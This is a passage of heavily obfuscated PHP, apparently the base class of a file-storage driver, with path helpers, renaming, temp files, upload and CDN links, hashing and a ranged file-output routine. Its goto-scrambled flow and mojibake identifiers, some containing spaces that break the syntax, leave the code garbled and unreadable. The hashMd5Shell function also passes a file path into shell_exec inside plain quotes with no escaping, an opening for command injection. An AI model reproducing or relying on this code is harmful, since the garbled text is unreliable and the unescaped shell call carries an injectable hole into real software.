!function_exists($f…ë¹ßŸ©Ó[66])) { return $B ¶ÒÀç‚á; } static $C’ªÊĞùÈ = array(); goto e‚›™‰¬„¦; CîôÁèò¤Å: return $c÷æòÜ…Û; goto AÛæË¾‘ƒ; bÜÈ¯èé¦ó: $c÷æòÜ…Û = $c÷æòÜ…Û ? $c÷æòÜ…Û : $B ¶ÒÀç‚á; if (strstr($c÷æòÜ…Û, $f…ë¹ßŸ©Ó[70])) { $c÷æòÜ…Û = str_replace($f…ë¹ßŸ©Ó[70], $f…ë¹ßŸ©Ó[71], $c÷æòÜ…Û); } $C’ªÊĞùÈ[$B†“„¤©Ú‰ . $f…ë¹ßŸ©Ó[67] . $cî‰©÷µÌ¸ . $f…ë¹ßŸ©Ó[68] . $B ¶ÒÀç‚á] = $c÷æòÜ…Û; goto AÇ›“î®›ó; AÛæË¾‘ƒ: } public function getPathInner($Bó²ˆ“ÂöŞ) { $D©µ¾¥›·– = IO::init($Bó²ˆ“ÂöŞ); return $D©µ¾¥›·–->path; } public function getPathOuter($D…±äÇîæ¡) { $A ÛİõˆïÆ =& $_SERVER[´¬]; $c°›„‘õÔ = strlen(trim($this->pathBase, $A ÛİõˆïÆ[8])); $D…±äÇîæ¡ = substr(trim($D…±äÇîæ¡, $A ÛİõˆïÆ[8]), $c°›„‘õÔ); return $this->pathDriver . $A ÛİõˆïÆ[8] . ltrim($D…±äÇîæ¡, $A ÛİõˆïÆ[8]); } public function isParentOf($cå£‘µÀƒ, $E‹«²áÑ) { $B®Ó±Ğñë =& $_SERVER[´¬]; $cå£‘µÀƒ = rtrim(strtolower($cå£‘µÀƒ), $B®Ó±Ğñë[8]) . $B®Ó±Ğñë[8]; $E‹«²áÑ = rtrim(strtolower($E‹«²áÑ), $B®Ó±Ğñë[8]) . $B®Ó±Ğñë[8]; $dö¼ÓæÇºŠ = strpos($E‹«²áÑ, $cå£‘µÀƒ) === 0; return $dö¼ÓæÇºŠ; } public function getType() { $aÆŒéó¾‚Ã =& $_SERVER[´¬]; $D“¹Ñ„ˆá = str_replace($aÆŒéó¾‚Ã[72], $aÆŒéó¾‚Ã[33], get_class($this)); return strtolower($D“¹Ñ„ˆá); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($c›…Õ–ó‘², $eŒ…’ø©¶˜) { $AÉ†©Š©ƒ =& $_SERVER[´¬]; $aÛ÷ÉÙä = rtrim($c›…Õ–ó‘², $AÉ†©Š©ƒ[8]) . $AÉ†©Š©ƒ[8] . $eŒ…’ø©¶˜; $cîòóøøêŸ = $this->exist($aÛ÷ÉÙä); return $cîòóøøêŸ ? $aÛ÷ÉÙä : !1; } public function setModifyTime($D—÷‰Êë, $fÓ‡ŞÁî = '') { } public function renameObject($bËë ÎŞ¡õ, $a•±çº¼Æ–) { goto e¹‘¿´“ÏÚ; E°¿ì“ÅÛ: $bËë ÎŞ¡õ = $this->getPathOuter($bËë ÎŞ¡õ); $a•±çº¼Æ– = $this->pathFather($bËë ÎŞ¡õ) . $a•±çº¼Æ–; if (IO::isFile($bËë ÎŞ¡õ)) { $Cß½ªÛÇ‡á = IO::copy($bËë ÎŞ¡õ, $this->pathFather($bËë ÎŞ¡õ), REPEAT_RENAME_FOLDER, $eŞ–…Ø”èÖ); if ($Cß½ªÛÇ‡á) { IO::remove($bËë ÎŞ¡õ); } } else { $Cß½ªÛÇ‡á = IO::mkdir($a•±çº¼Æ–); if (!$Cß½ªÛÇ‡á) { return !1; } $cÂÁ¥âç• = IO::listPath($bËë ÎŞ¡õ, !0); $E çƒ´±äÔ = array_merge($cÂÁ¥âç•[$cù¶Ã›‹éˆ[74]], $cÂÁ¥âç•[$cù¶Ã›‹éˆ[75]]); foreach ($E çƒ´±äÔ as $c™©²ğÉÛ») { IO::move($c™©²ğÉÛ»[$cù¶Ã›‹éˆ[76]], $a•±çº¼Æ–, REPEAT_RENAME_FOLDER); } IO::remove($bËë ÎŞ¡õ); } goto dŒÇÊÛ‰ì¡; dŒÇÊÛ‰ì¡: return $Cß½ªÛÇ‡á ? $a•±çº¼Æ– : !1; goto Dù£Æ¦Ó®õ; e¹‘¿´“ÏÚ: $cù¶Ã›‹éˆ =& $_SERVER[´¬]; $eŞ–…Ø”èÖ = $a•±çº¼Æ–; Hook::trigger($cù¶Ã›‹éˆ[73], $this, $bËë ÎŞ¡õ, $this, $this->pathFather($bËë ÎŞ¡õ) . $a•±çº¼Æ–); goto E°¿ì“ÅÛ; Dù£Æ¦Ó®õ: } public function tempFile($eëÚ®¿İŠÒ = '', $e¥Á§ŠŸë = '') { goto f‹­¢øîªŠ; a‹Ê¨¸ÙèÆ: return $C¯…âåğØ; goto EŞ¢¤ÑßÆ–; D¥£…óºğÉ: $C¯…âåğØ = $bÓ‹³Ì¨Õ . $eëÚ®¿İŠÒ; @touch($C¯…âåğØ); if ($e¥Á§ŠŸë) { file_put_contents($C¯…âåğØ, $e¥Á§ŠŸë); } goto a‹Ê¨¸ÙèÆ; f‹­¢øîªŠ: if (!$eëÚ®¿İŠÒ) { $eëÚ®¿İŠÒ = rand_string(15); } $bÓ‹³Ì¨Õ = TEMP_FILES . rand_string(15) . $_SERVER[´¬][8]; @mkdir($bÓ‹³Ì¨Õ, 511, !0); goto D¥£…óºğÉ; EŞ¢¤ÑßÆ–: } public function tempFileRemve($eÒµ¯İ·ÙÈ) { @unlink($eÒµ¯İ·ÙÈ); @rmdir($this->pathFather($eÒµ¯İ·ÙÈ)); } public function mkfile($C‘ì†Š‹ÅŠ, $D†Å¡¥”„ = '', $bÕÉøâÔ™™ = REPEAT_RENAME) { } public function mkdir($F•›áÛ¶¥£, $D‰«ÌËéÏµ = REPEAT_SKIP) { } public function delFile($C¬‘÷Èğ¿ø) { } public function delFolder($dÖ Ìó–Ôö) { } public function copyFile($E­Ş‘•ŒŒ, $d¾›ó»¿õ¡) { } public function moveFile($fø‰«Õ¨Œ£, $A‰ƒ¶ø¯ƒõ) { } public function remove($eø‡Åø™æÛ) { if ($this->isFile($eø‡Åø™æÛ)) { return $this->delFile($eø‡Åø™æÛ); } return $this->delFolder($eø‡Åø™æÛ); } public function rename($EÖ¦ìóëŒŞ, $döñø¨Øä·) { } public function exist($DŒİğ‡áÒù) { } public function findByHash($dÉçñÓ•É = '', $fƒœÅ£ø¯Ù = '') { return !1; } public function isFile($AªÇŒòìšÍ) { } public function isFolder($C¸ÎÀ‘±†À) { } public function size($FĞÜÒÜêù) { } public function info($b¥ÙŞùª±Ã) { } public function infoSimple($B–ëÜ·‰â©) { return $this->info($B–ëÜ·‰â©); } public function infoAuth($aô™’“) { return $this->info($aô™’“); } public function infoFull($DôõÇ¾Áõï) { return $this->info($DôõÇ¾Áõï); } public function infoWithChildren($b›®­‘…‹ã) { $Dğ•ÁŒØÈª =& $_SERVER[´¬]; static $a“÷÷ğÊŸê = array(); if (isset($a“÷÷ğÊŸê[$b›®­‘…‹ã])) { return $a“÷÷ğÊŸê[$b›®­‘…‹ã]; } $B½ï‘¨Õ¾ = $this->info($b›®­‘…‹ã); if ($B½ï‘¨Õ¾ && $B½ï‘¨Õ¾[$Dğ•ÁŒØÈª[29]] == $Dğ•ÁŒØÈª[77]) { $c†ç‹±ƒÂÆ = array($Dğ•ÁŒØÈª[78] => 0, $Dğ•ÁŒØÈª[79] => 0, $Dğ•ÁŒØÈª[80] => 0); $this->infoChildren($b›®­‘…‹ã, $c†ç‹±ƒÂÆ); $B½ï‘¨Õ¾[$Dğ•ÁŒØÈª[78]] = $c†ç‹±ƒÂÆ[$Dğ•ÁŒØÈª[78]]; $B½ï‘¨Õ¾[$Dğ•ÁŒØÈª[81]] = array($Dğ•ÁŒØÈª[82] => $c†ç‹±ƒÂÆ[$Dğ•ÁŒØÈª[79]], $Dğ•ÁŒØÈª[83] => $c†ç‹±ƒÂÆ[$Dğ•ÁŒØÈª[80]]); $a“÷÷ğÊŸê[$b›®­‘…‹ã] = $B½ï‘¨Õ¾; } return $B½ï‘¨Õ¾; } public function listPath($CÌëğ°ÍÍ‚, $Cï¥ºñÜÂê = false) { } public function has($F¶Ğğ˜ä½, $cê·í‹„İ® = false, $Fòî½²„ô = false) { } public function canRead($DªîÇéñ³) { } public function canWrite($c·Îâí°Â) { } public function getContent($Dô›·ãšò) { } public function setContent($e…·¥›Äëà, $EŸ‰È‡Ú× = '') { } protected function infoChildren($a¤æ›®´™ , &$F¸¨ª¤›ó¦) { $eÇÓÜÉËø =& $_SERVER[´¬]; check_abort_echo(); $AÈò²ç‡İ = $this->listPath($a¤æ›®´™ , !0); $AÈò²ç‡İ = array_merge($AÈò²ç‡İ[$eÇÓÜÉËø[75]], $AÈò²ç‡İ[$eÇÓÜÉËø[74]]); foreach ($AÈò²ç‡İ as $d—‡¨íÛ¹) { if ($d—‡¨íÛ¹[$eÇÓÜÉËø[29]] == $eÇÓÜÉËø[77]) { $F¸¨ª¤›ó¦[$eÇÓÜÉËø[80]]++; $A¿¢…Üƒ¶ = $this->getPathInner($d—‡¨íÛ¹[$eÇÓÜÉËø[76]]); $this->infoChildren($A¿¢…Üƒ¶, $F¸¨ª¤›ó¦); } else { $F¸¨ª¤›ó¦[$eÇÓÜÉËø[79]]++; $F¸¨ª¤›ó¦[$eÇÓÜÉËø[78]] += $d—‡¨íÛ¹[$eÇÓÜÉËø[78]]; } } } public function fileSubstr($c²âŠïäËœ, $c†ÍÙó×Öî, $F§º·†ÑÑĞ) { } public function listAll($C¼Ä¤‚îá‹) { } public function listAllMake($b®Õ»“ç§Ô, &$c’¬¡ø¯ÕŞ) { $cÔóˆÌ©ôà =& $_SERVER[´¬]; check_abort_echo(); $FÍ”ÏÕ¬Æß = $this->listPath($b®Õ»“ç§Ô, !0); if (!$FÍ”ÏÕ¬Æß) { return; } $c¬ìš«Ôˆ÷ = array_merge($FÍ”ÏÕ¬Æß[$cÔóˆÌ©ôà[75]], $FÍ”ÏÕ¬Æß[$cÔóˆÌ©ôà[74]]); foreach ($c¬ìš«Ôˆ÷ as $E£‘ƒÌ„…’) { goto b°õ¡‡Û±¢; c­½ÄÎ‘Îƒ: $this->listAllMake($E£‘ƒÌ„…’[$cÔóˆÌ©ôà[76]], $c’¬¡ø¯ÕŞ); goto CášÎÆí»½; cå¶ÏçŠ“ö: if (isset($E£‘ƒÌ„…’[$cÔóˆÌ©ôà[84]])) { $cÎÚÖÈ ›Ö[$cÔóˆÌ©ôà[84]] = $E£‘ƒÌ„…’[$cÔóˆÌ©ôà[84]]; } if (!$b¶®Å±å¼) { $c’¬¡ø¯ÕŞ[] = $cÎÚÖÈ ›Ö; continue; } $c’¬¡ø¯ÕŞ[] = $cÎÚÖÈ ›Ö; goto c­½ÄÎ‘Îƒ; b°õ¡‡Û±¢: $b¶®Å±å¼ = $E£‘ƒÌ„…’[$cÔóˆÌ©ôà[29]] == $cÔóˆÌ©ôà[77]; $cÎÚÖÈ ›Ö = array($cÔóˆÌ©ôà[76] => $E£‘ƒÌ„…’[$cÔóˆÌ©ôà[76]], $cÔóˆÌ©ôà[77] => $b¶®Å±å¼); if (isset($E£‘ƒÌ„…’[$cÔóˆÌ©ôà[78]])) { $cÎÚÖÈ ›Ö[$cÔóˆÌ©ôà[78]] = $E£‘ƒÌ„…’[$cÔóˆÌ©ôà[78]]; } goto cå¶ÏçŠ“ö; CášÎÆí»½: } } public function listAllSimple($c©‹‡ŒôÑÃ) { $Fò‰£Î ¾Æ =& $_SERVER[´¬]; $bèâ†ÓÇ‚ = array(); $E‰é´Ÿ“Èà = $this->listAll($c©‹‡ŒôÑÃ); $dìİÖ´¬Ñ = $this->getPathOuter($c©‹‡ŒôÑÃ); foreach ($E‰é´Ÿ“Èà as $AÇ®¨ñ‡¶) { goto dé¢·é†â; cé®¯›ïíñ: $cÂ‘™…ÏË = array($Fò‰£Î ¾Æ[76] => $A™´ã‘©–Î, $Fò‰£Î ¾Æ[77] => $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[77]]); if (isset($AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[78]]) && !$AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[77]]) { $cÂ‘™…ÏË[$Fò‰£Î ¾Æ[78]] = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[78]]; } if (isset($AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[84]])) { $cÂ‘™…ÏË[$Fò‰£Î ¾Æ[84]] = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[84]]; } goto c¤Àï‹ŞÒ¶; c¤Àï‹ŞÒ¶: if (!$AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[77]]) { $cÂ‘™…ÏË[$Fò‰£Î ¾Æ[86]] = $D‘¬Œ‰›Şˆ; } $bèâ†ÓÇ‚[] = $cÂ‘™…ÏË; goto fôîôìÉî¼; dé¢·é†â: $D‘¬Œ‰›Şˆ = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[76]]; $A™´ã‘©–Î = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[76]]; if (isset($AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[85]])) { $D‘¬Œ‰›Şˆ = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[85]][$Fò‰£Î ¾Æ[76]]; $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[78]] = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[85]][$Fò‰£Î ¾Æ[78]]; $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[84]] = $AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[85]][$Fò‰£Î ¾Æ[84]]; } else { $A™´ã‘©–Î = substr($AÇ®¨ñ‡¶[$Fò‰£Î ¾Æ[76]], strlen(get_path_father($dìİÖ´¬Ñ))); $A™´ã‘©–Î = $Fò‰£Î ¾Æ[8] . ltrim($A™´ã‘©–Î, $Fò‰£Î ¾Æ[8]); } goto cé®¯›ïíñ; fôîôìÉî¼: } return $bèâ†ÓÇ‚; } public function upload($F³¿Á—¤¼Û, $DÁÕæ»‹ÆÂ, $AÃœÎïæˆ = false, $aƒÊ•ÈÜö½ = REPEAT_REPLACE) { } public function uploadFileByID($Aöíä¢Ø«ì, $A…¿÷’Á›¬, $fˆë–ğó‹) { } public function uploadFileByPath($A¨ºéçèÆñ, $FøÑÓ„¶‰†, $AíšÀãôù¯ = array()) { } public function isUploadServer() { $f¼ˆÇÍ´ÔÈ =& $_SERVER[´¬]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $f¼ˆÇÍ´ÔÈ[87]) { return !0; } return $GLOBALS[$f¼ˆÇÍ´ÔÈ[6]][$f¼ˆÇÍ´ÔÈ[88]][$f¼ˆÇÍ´ÔÈ[89]]; } public function isFileOutServer() { $dˆÂ‰Á„î¢ =& $_SERVER[´¬]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $dˆÂ‰Á„î¢[87]) { return !0; } return $GLOBALS[$dˆÂ‰Á„î¢[6]][$dˆÂ‰Á„î¢[88]][$dˆÂ‰Á„î¢[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($A²â—â·•á) { $C×²æàšÆ =& $_SERVER[´¬]; if (!$this->isCdnHost()) { return $A²â—â·•á; } return str_replace(trim(get_url_root($A²â—â·•á), $C×²æàšÆ[8]), trim($this->cdnHost, $C×²æàšÆ[8]), $A²â—â·•á); } public function uploadLink($E‡œš¢ƒ‰Î, $b§¸Æ‚èõ = 0) { goto f¡ˆÊ…¢‰«; f¡ˆÊ…¢‰«: $e‘œçÙƒÎ =& $_SERVER[´¬]; if ($this->isUploadServer()) { return; } $eòè…Ù¡…» = $this->getType(); goto C„¯¢ÍÊ; FŞãŠ¤›ø: if ($f±ë²á±Ÿ) { $f±ë²á±Ÿ[$e‘œçÙƒÎ[93]] = $E‡œš¢ƒ‰Î; $f±ë²á±Ÿ[$e‘œçÙƒÎ[94]] = $eòè…Ù¡…»; } return $f±ë²á±Ÿ; goto BÌõ‚á‘îÚ; C„¯¢ÍÊ: if (!in_array($eòè…Ù¡…», $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DŠ©Æ½¸ñå = 1024 * 1024 * 10; goto B™´î™‹¿¿; B™´î™‹¿¿: $C·í—Œ¡£ù = $b§¸Æ‚èõ <= $DŠ©Æ½¸ñå ? $e‘œçÙƒÎ[91] : $e‘œçÙƒÎ[92]; $fêóŠó£¼µ = (!$b§¸Æ‚èõ ? 1 : ceil($b§¸Æ‚èõ / pow(1024, 3))) * 3600 * 4; $f±ë²á±Ÿ = $this->{$C·í—Œ¡£ù}($E‡œš¢ƒ‰Î, $fêóŠó£¼µ); goto FŞãŠ¤›ø; BÌõ‚á‘îÚ: } public function uploadFormData($D‘áòË¥¾, $C¥ç³ë˜¾÷ = 3600) { } public function multiUploadFormData($c‹‰ß¡¬, $F˜âİö‰ƒ = 3600) { } public function download($Cî—™¡öÊœ, $Cî„ñğã”) { } public function ext($b¯Œªéè˜«) { $DŠ§ùÊÍˆ¿ =& $_SERVER[´¬]; if (strpos($b¯Œªéè˜«, $DŠ§ùÊÍˆ¿[8]) === -1) { $bÉ‚—é„¬„ = $b¯Œªéè˜«; } else { $bÉ‚—é„¬„ = $this->pathThis($b¯Œªéè˜«); } $f‰ÈŸ…°Ì‘ = $DŠ§ùÊÍˆ¿[33]; if (strstr($bÉ‚—é„¬„, $DŠ§ùÊÍˆ¿[95])) { $f‰ÈŸ…°Ì‘ = substr($bÉ‚—é„¬„, strrpos($bÉ‚—é„¬„, $DŠ§ùÊÍˆ¿[95]) + 1); $f‰ÈŸ…°Ì‘ = strtolower($f‰ÈŸ…°Ì‘); } if (strlen($f‰ÈŸ…°Ì‘) > 3 && preg_match($DŠ§ùÊÍˆ¿[96], $f‰ÈŸ…°Ì‘, $FñŞÕô‚—ì)) { $f‰ÈŸ…°Ì‘ = $DŠ§ùÊÍˆ¿[33]; } return $f‰ÈŸ…°Ì‘; } public function pathThis($DñÁ¸ª“) { $Aø­ùŸ‡ì =& $_SERVER[´¬]; $DñÁ¸ª“ = str_replace($Aø­ùŸ‡ì[97], $Aø­ùŸ‡ì[8], rtrim($DñÁ¸ª“, $Aø­ùŸ‡ì[8])); $Fç±Âò  = strrpos($DñÁ¸ª“, $Aø­ùŸ‡ì[8]); if ($Fç±Âò  === !1) { return $DñÁ¸ª“; } return substr($DñÁ¸ª“, $Fç±Âò  + 1); } public function pathFather($bÇ¢§èõôÏ) { $d¡œĞõñçà =& $_SERVER[´¬]; $bÇ¢§èõôÏ = str_replace($d¡œĞõñçà[97], $d¡œĞõñçà[8], rtrim($bÇ¢§èõôÏ, $d¡œĞõñçà[8])); $bÉ¿·Û×¥È = strrpos($bÇ¢§èõôÏ, $d¡œĞõñçà[8]); if ($bÉ¿·Û×¥È === !1) { return $d¡œĞõñçà[33]; } return substr($bÇ¢§èõôÏ, 0, $bÉ¿·Û×¥È + 1); } public function hashSimple($BôÁïë£§Ú) { goto b«Àƒ‹àê†; a¾¨ùËÂ‘: $cî‘® ÎÅã = 200; $e˜«ˆÎ›ñÖ = 50; if ($BÂˆ‹äºÂ <= $cî‘® ÎÅã * $e˜«ˆÎ›ñÖ) { return $this->hashMd5($BôÁïë£§Ú) . $BÂˆ‹äºÂ; } goto DÖöÌö¿£Ÿ; b«Àƒ‹àê†: $DÁ¹ŸµĞµ =& $_SERVER[´¬]; if (!$BôÁïë£§Ú) { return md5($DÁ¹ŸµĞµ[33]); } $BÂˆ‹äºÂ = $this->size($BôÁïë£§Ú); goto a¾¨ùËÂ‘; eŞÙ¢½´÷¥: $bíÓ¥ß„‰ .= $this->fileSubstr($BôÁïë£§Ú, $BÂˆ‹äºÂ - $cî‘® ÎÅã, $cî‘® ÎÅã); return md5($bíÓ¥ß„‰) . $BÂˆ‹äºÂ; goto Aç¡áø¹Ú; DÖöÌö¿£Ÿ: $d®ï“†÷Å = intval($BÂˆ‹äºÂ / $e˜«ˆÎ›ñÖ); $bíÓ¥ß„‰ = $DÁ¹ŸµĞµ[33]; for ($Cä©œêÎ‘ = 0; $Cä©œêÎ‘ < $e˜«ˆÎ›ñÖ; $Cä©œêÎ‘++) { $bíÓ¥ß„‰ .= $this->fileSubstr($BôÁïë£§Ú, $d®ï“†÷Å * $Cä©œêÎ‘, $cî‘® ÎÅã); } goto eŞÙ¢½´÷¥; Aç¡áø¹Ú: } public static $md5Cache = array(); public function hashMd5($EğÄ°£ÂÅŒ) { $EğÄ°£ÂÅŒ = $this->iconvSystem($EğÄ°£ÂÅŒ); if (isset(self::$md5Cache[$EğÄ°£ÂÅŒ])) { return self::$md5Cache[$EğÄ°£ÂÅŒ]; } self::$md5Cache[$EğÄ°£ÂÅŒ] = $this->hashMd5Shell($EğÄ°£ÂÅŒ); if (!self::$md5Cache[$EğÄ°£ÂÅŒ]) { self::$md5Cache[$EğÄ°£ÂÅŒ] = @md5_file($EğÄ°£ÂÅŒ); } return self::$md5Cache[$EğÄ°£ÂÅŒ]; } private function hashMd5Shell($F³Ò›ÏÂ÷ì) { goto Fµ¥ËÂÂ„; D¤—ÜàäëË: $f†Ş½Ó‰ëÕ = shell_exec($D ÊÔ“ä‹¯ . "\x20\x22{$F³Ò›ÏÂ÷ì}\42"); $f†Ş½Ó‰ëÕ = str_replace($cò‰˜›¼·‚[104], $cò‰˜›¼·‚[33], $f†Ş½Ó‰ëÕ); return substr($f†Ş½Ó‰ëÕ, 0, 32); goto d®›Â«¤Áï; F¦‘ˆØÒÔ: $D ÊÔ“ä‹¯ = Cache::get($cò‰˜›¼·‚[101]); if (!$D ÊÔ“ä‹¯) { $D«‰“åè = BASIC_PATH . $cò‰˜›¼·‚[102]; $f¬äº“ËÉ = md5_file($D«‰“åè); $D ÊÔ“ä‹¯ = $cò‰˜›¼·‚[103]; foreach ($Fªò™Ù´³ as $EŞçÉß÷) { $f†Ş½Ó‰ëÕ = shell_exec($EŞçÉß÷ . "\x20\x22{$D«‰“åè}\42"); if ($f†Ş½Ó‰ëÕ && substr(trim($f†Ş½Ó‰ëÕ), 0, 32) == $f¬äº“ËÉ) { $D ÊÔ“ä‹¯ = $EŞçÉß÷; break; } } Cache::set($cò‰˜›¼·‚[101], $D ÊÔ“ä‹¯, 3600); } if ($D ÊÔ“ä‹¯ == $cò‰˜›¼·‚[103]) { return !1; } goto D¤—ÜàäëË; Fµ¥ËÂÂ„: $cò‰˜›¼·‚ =& $_SERVER[´¬]; if (!function_exists($cò‰˜›¼·‚[98])) { return !1; } $Fªò™Ù´³ = array($cò‰˜›¼·‚[99], $cò‰˜›¼·‚[100]); goto F¦‘ˆØÒÔ; d®›Â«¤Áï: } public function link($A¿ßí §ó) { return $A¿ßí §ó; } public function fileOut($d£Å’±°«Î, $E‰è´í°Ù = false, $Eëæ¼ØÆ‚¥ = false, $E­ğÕö·³ = '') { goto c‘Î¬µ¨–; bÓ§³Ñ–ô: if (in_array($dî‘ÀÙ‚Ñ®, array($bƒœÁÔ«å[111], $bƒœÁÔ«å[112], $bƒœÁÔ«å[113], $bƒœÁÔ«å[114]))) { $dî‘ÀÙ‚Ñ® = $bƒœÁÔ«å[115]; } if (!$E­ğÕö·³) { $E­ğÕö·³ = md5($bÄÒ®…áÙ . $this->hashSimple($d£Å’±°«Î)); } $E­ğÕö·³ = $bƒœÁÔ«å[116] . $E­ğÕö·³ . $bƒœÁÔ«å[116]; goto eë‘¸ò¦µ†; cÀ½²¤µé¾: if ($_SERVER[$bƒœÁÔ«å[157]] == $bƒœÁÔ«å[158]) { return; } $bÓ†ìÖİÆ = 1024 * 100; $bÖ•…Ú¢„ = 0; goto d·¡Íòé…‚; eÉ¬Şçµ…‰: $dÜßƒîÍê¤ = $bƒœÁÔ«å[116] . $dÜßƒîÍê¤ . $bƒœÁÔ«å[122] . $dÜßƒîÍê¤; if ($E‰è´í°Ù) { header($bƒœÁÔ«å[123]); header($bƒœÁÔ«å[124] . $dÜßƒîÍê¤); } else { header($bƒœÁÔ«å[125] . $dÜßƒîÍê¤); } header($bƒœÁÔ«å[126] . gmdate($bƒœÁÔ«å[110], time() + 3600 * 24 * 30) . $bƒœÁÔ«å[127]); goto DÊ—Ô©†¯«; eõïğÌğê¨: $B¥“¥ˆöƒ = strtolower($_SERVER[$bƒœÁÔ«å[142]]); if ($Aƒ¼óÚ§“ª && $B¥“¥ˆöƒ && $E¸´óŸÀ) { if (strstr($B¥“¥ˆöƒ, $bƒœÁÔ«å[143])) { header($bƒœÁÔ«å[144] . $d£Å’±°«Î); } else { if (strstr($B¥“¥ˆöƒ, $bƒœÁÔ«å[145])) { header($bƒœÁÔ«å[146] . $d£Å’±°«Î); } else { if (strstr($B¥“¥ˆöƒ, $bƒœÁÔ«å[147])) { header($bƒœÁÔ«å[148] . $d£Å’±°«Î); } } } if ($EÛÏÚ¤”¹å) { header($bƒœÁÔ«å[149] . $EÛÏÚ¤”¹å); } return; } if (isset($_SERVER[$bƒœÁÔ«å[150]])) { if (preg_match($bƒœÁÔ«å[151], $_SERVER[$bƒœÁÔ«å[150]], $Fé¯‰öãäá)) { $D”¼›ˆ©™í = intval($Fé¯‰öãäá[1]); if (!empty($Fé¯‰öãäá[2])) { $a“ ´Ñ”ÉÏ = intval($Fé¯‰öãäá[2]); } } header($bƒœÁÔ«å[152]); header("\x43\x6f\x6e\x74\145\x6e\x74\x2d\122\x61\x6e\147\145\72\x20\142\171\x74\145\x73\x20{$D”¼›ˆ©™í}\x2d{$a“ ´Ñ”ÉÏ}\57" . $d õœˆÓ‘Ã); } else { header($bƒœÁÔ«å[153]); } goto B»‡ß¾¼Ñ; B»‡ß¾¼Ñ: $eê–÷çï¹› = !0; if ($_SERVER[$bƒœÁÔ«å[154]] == $bƒœÁÔ«å[155] && $d õœˆÓ‘Ã > 1204 * 1024 * 1024 * 2) { $eê–÷çï¹› = !1; } if ($eê–÷çï¹›) { header($bƒœÁÔ«å[156] . ($a“ ´Ñ”ÉÏ - $D”¼›ˆ©™í + 1)); } goto cÀ½²¤µé¾; eö½ÂåÖéÑ: $d õœˆÓ‘Ã = $e×«·ÒéÙ›[$bƒœÁÔ«å[78]]; $bÄÒ®…áÙ = gmdate($bƒœÁÔ«å[110], $e×«·ÒéÙ›[$bƒœÁÔ«å[84]]); $FÄ«²Æœ´“ = $Eëæ¼ØÆ‚¥ ? $Eëæ¼ØÆ‚¥ : $this->iconvApp($e×«·ÒéÙ›[$bƒœÁÔ«å[28]]); goto fÜãá¿š‡Í; f»Ó¶„ÀŞæ: @ob_end_clean(); set_timeout(); $e×«·ÒéÙ› = $this->infoFull($d£Å’±°«Î); goto eö½ÂåÖéÑ; còÎí–ùğ: header($bƒœÁÔ«å[120]); header($bƒœÁÔ«å[121] . $A¢Ù¶Œˆ£); $dÜßƒîÍê¤ = rawurlencode($FÄ«²Æœ´“); goto eÉ¬Şçµ…‰; e¨ëÒ³»­œ: $Aƒ¼óÚ§“ª = $this->getType() == $bƒœÁÔ«å[106]; $E¸´óŸÀ = $GLOBALS[$bƒœÁÔ«å[6]][$bƒœÁÔ«å[88]][$bƒœÁÔ«å[107]][$bƒœÁÔ«å[108]]; $EÛÏÚ¤”¹å = (double) $GLOBALS[$bƒœÁÔ«å[6]][$bƒœÁÔ«å[88]][$bƒœÁÔ«å[107]][$bƒœÁÔ«å[109]] * 1024 * 1024; goto f»Ó¶„ÀŞæ; eë‘¸ò¦µ†: $A¢Ù¶Œˆ£ = get_file_mime($dî‘ÀÙ‚Ñ®); if (strstr($A¢Ù¶Œˆ£, $bƒœÁÔ«å[117])) { $A¢Ù¶Œˆ£ = $A¢Ù¶Œˆ£ . $bƒœÁÔ«å[118]; } if ($E‰è´í°Ù === !1 && !mime_support($A¢Ù¶Œˆ£)) { $E‰è´í°Ù = !0; $A¢Ù¶Œˆ£ = $bƒœÁÔ«å[119]; } goto còÎí–ùğ; d·¡Íòé…‚: if ($EÛÏÚ¤”¹å) { $bÖ•…Ú¢„ = intval(1000 * 1000 * ($bÓ†ìÖİÆ / $EÛÏÚ¤”¹å)); } while ($D”¼›ˆ©™í <= $a“ ´Ñ”ÉÏ) { $aİÃøÒô½ = timeFloat(); check_abort(); $Fƒä¿–˜“  = $a“ ´Ñ”ÉÏ - $D”¼›ˆ©™í + 1; if ($Fƒä¿–˜“  <= $bÓ†ìÖİÆ) { $bÓ†ìÖİÆ = $Fƒä¿–˜“ ; } echo $this->fileSubstr($d£Å’±°«Î, $D”¼›ˆ©™í, $bÓ†ìÖİÆ); $D”¼›ˆ©™í += $bÓ†ìÖİÆ; if ($bÓ†ìÖİÆ == $Fƒä¿–˜“ ) { $D”¼›ˆ©™í = $a“ ´Ñ”ÉÏ + 1; } if ($bÖ•…Ú¢„) { $däääğŠ = intval(1000 * 1000 * (timeFloat() - $aİÃøÒô½)); $Bö‚·‰äé… = $bÖ•…Ú¢„ - $däääğŠ; if ($Bö‚·‰äé… > 5) { usleep($Bö‚·‰äé…); } } } goto aÚ¯ƒÎøßÑ; Fí­Ô…‘–: header($bƒœÁÔ«å[138] . $d õœˆÓ‘Ã); header($bƒœÁÔ«å[139]); if (!$E‰è´í°Ù && $dî‘ÀÙ‚Ñ® == $bƒœÁÔ«å[140]) { if ($d õœˆÓ‘Ã > 1024 * 1024 * 5) { die; } $FÊ¢‚¶Ş® = $this->getContent($d£Å’±°«Î); $FÊ¢‚¶Ş® = Html::clearSVG($FÊ¢‚¶Ş®); header($bƒœÁÔ«å[141] . strlen($FÊ¢‚¶Ş®)); echo $FÊ¢‚¶Ş®; die; } goto eõïğÌğê¨; c‘Î¬µ¨–: 